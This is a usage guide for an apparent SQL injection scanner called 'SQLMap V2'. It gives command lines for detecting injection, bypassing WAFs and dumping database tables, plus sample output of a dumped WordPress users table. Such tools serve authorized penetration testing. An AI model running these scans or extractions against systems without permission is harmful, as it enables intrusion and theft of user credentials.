# EXAMPLES.md
# SQLMap V2 - Example Usage

## Basic Scanning

### Simple GET parameter scan
```bash
python main.py --url "http://target.com/search?q=test"
```

### POST parameter scan
```bash
python main.py --url "http://target.com/login" --method POST --data "user=admin&password=test"
```

### With JSON payload
```bash
python main.py --url "http://target.com/api/users" --method POST --json --data '{"id":1,"name":"test"}'
```

## Advanced Scanning Options

### Proxy configuration (for Burp Suite, etc.)
```bash
python main.py --url "http://target.com/search?q=test" --proxy "http://127.0.0.1:8080"
```

### Custom headers
```bash
python main.py --url "http://target.com/api" \
  --headers "User-Agent:Mozilla/5.0" "Authorization:Bearer token123"
```

### Cookie injection
```bash
python main.py --url "http://target.com" --cookie "session=abc123;userid=1"
```

### WAF bypass techniques
```bash
python main.py --url "http://target.com/search?q=test" --waf-bypass
```

## Detection Techniques

### Test specific SQLi technique
```bash
# Error-based
python main.py --url "http://target.com/search?q=test" --technique error

# Boolean-based blind
python main.py --url "http://target.com/search?q=test" --technique boolean

# Time-based blind with custom delay
python main.py --url "http://target.com/search?q=test" --technique time --delay 10

# UNION-based
python main.py --url "http://target.com/search?q=test" --technique union
```

## Data Extraction

### Automatic data extraction after vulnerability discovery
```bash
python main.py --url "http://target.com/search?q=test" --extract
```

### Extract specific database and table
```bash
python main.py --url "http://target.com/search?q=test" \
  --extract --db "websitedb" --table "users" --dump-limit 100
```

### Using blind SQLi for extraction
```bash
python main.py --url "http://target.com/search?q=test" \
  --extract --injection-type blind
```

## Reporting

### Export results as JSON
```bash
python main.py --url "http://target.com/search?q=test" \
  --extract --export-json "report.json"
```

### Export as HTML report
```bash
python main.py --url "http://target.com/search?q=test" \
  --extract --export-html "report.html"
```

### Both formats
```bash
python main.py --url "http://target.com/search?q=test" \
  --extract --export-json "report.json" --export-html "report.html"
```

## Advanced Configuration

### Multi-threaded scan with custom parameters
```bash
python main.py --url "http://target.com/search?q=test" \
  --threads 10 --timeout 15 --retries 3
```

### Verbose logging for debugging
```bash
python main.py --url "http://target.com/search?q=test" \
  --verbose --log-file "debug.log"
```

### Full exploitation workflow
```bash
python main.py \
  --url "http://vulnerable.com/product?id=1" \
  --method GET \
  --proxy "http://127.0.0.1:8080" \
  --threads 8 \
  --waf-bypass \
  --extract \
  --dump-limit 50 \
  --export-json "scan_report.json" \
  --export-html "scan_report.html" \
  --verbose
```

## Real-World Scenarios

### E-commerce product listing (numeric parameter)
```bash
python main.py --url "http://shop.local/products?category=5&sort=name" \
  --extract --db "shop_db" --table "products"
```

### Blog search functionality (string parameter)
```bash
python main.py --url "http://blog.local/search?query=test&author=admin" \
  --extract --table "posts"
```

### API endpoint with authentication
```bash
python main.py --url "http://api.local/v1/users?id=1" \
  --headers "Authorization:Bearer eyJhbGc..." \
  --cookie "session=xyz123" \
  --extract
```

### Behind WAF protection
```bash
python main.py --url "http://protected-site.com/search?q=test" \
  --waf-bypass \
  --threads 3 \
  --timeout 20
```

## Output Examples

### Successful Scan Results
```
══════════════════════════════════════════════════════════
█ SQLMap V2.0 - SQL Injection Scanner
█ Target: http://target.com/search?q=test
══════════════════════════════════════════════════════════

✓ VULNERABILITIES FOUND: 2

  [1] Parameter: q
      Type: boolean-based blind
      Confidence: 95.0%
      Injection Point: url

  [2] Parameter: sort
      Type: time-based blind  
      Confidence: 85.0%
      Injection Point: url

------------------------------------------------------------
Starting data extraction...
------------------------------------------------------------

✓ Extracted 8 databases
✓ Extracted 5 tables from wordpress_db
✓ Dumped 10 rows from wordpress_db.wp_users

  Columns: ID, user_login, user_email, user_pass
  Row 1: {'ID': '1', 'user_login': 'admin', 'user_email': 'admin@site.com', 'user_pass': 'hashed_pwd...'}
  Row 2: {'ID': '2', 'user_login': 'editor', 'user_email': 'editor@site.com', 'user_pass': 'hashed_pwd...'}
  ... and 8 more rows

✓ JSON report exported to: report_20260417_143022.json
✓ HTML report exported to: report_20260417_143022.html

============================================================
SQL INJECTION SCAN SUMMARY
============================================================
Target: http://target.com/search?q=test
Parameters Tested: 8
Vulnerabilities Found: 2
Scan Duration: 45.23s
============================================================
```

## Integration Examples

### Python Script Integration
```python
from scanner.injector import SQLiInjector
from utils.request_handler import RequestHandler
from analyzer.response_analyzer import ResponseAnalyzer
from scanner.payloads import PayloadGenerator

# Setup
request_handler = RequestHandler()
analyzer = ResponseAnalyzer()
payloads = PayloadGenerator()
injector = SQLiInjector(request_handler, analyzer, payloads)

# Scan
vulns = injector.scan("http://target.com/search?q=test")

# Process results
for vuln in vulns:
    print(f"Found {vuln['type']} in {vuln['parameter']}")
```

### JSON Report Integration
```python
import json

with open("report.json", "r") as f:
    report = json.load(f)
    
for vuln in report["vulnerabilities"]:
    print(f"Parameter: {vuln['parameter']}")
    print(f"Type: {vuln['type']}")
    print(f"Payload: {vuln['payload']}")
```

## Tips & Tricks

1. **Start with error-based**: Fastest, but may not work on hardened targets
2. **Use boolean-based as fallback**: Works on blind injection scenarios
3. **Time-based as last resort**: Slowest but most reliable
4. **Adjust threads cautiously**: Too many threads may trigger WAF
5. **Use proxies for inspection**: Burp Suite integration helps understand responses
6. **Enable verbose mode for debugging**: Essential for troubleshooting false negatives
7. **Check logs regularly**: `tail -f logs/sqlmap_v2.log` for real-time updates
